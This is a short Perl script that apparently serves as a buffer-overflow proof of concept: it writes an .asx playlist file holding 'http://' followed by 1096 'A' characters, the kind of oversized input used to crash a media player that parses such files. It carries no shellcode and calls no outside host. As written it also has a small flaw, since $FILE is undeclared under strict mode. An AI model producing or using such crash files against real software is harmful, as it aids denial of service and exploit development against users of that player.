#!/usr/local/bin/perl                                          
                                                               
use strict;                                                    
                                                               
use warnings;                                                  
                                                               
my $file="myfile.asx";                             
                                                               
my $payload = "A" x 1096;                                      
                                                               
open( $FILE, ">>$file") or die "Cannot open $file: $!";        
                                                               
print $FILE "http://".$payload;                                
                                                               
close($FILE);                                                  
                                                               
print "$file has been created \n";                             
                                      
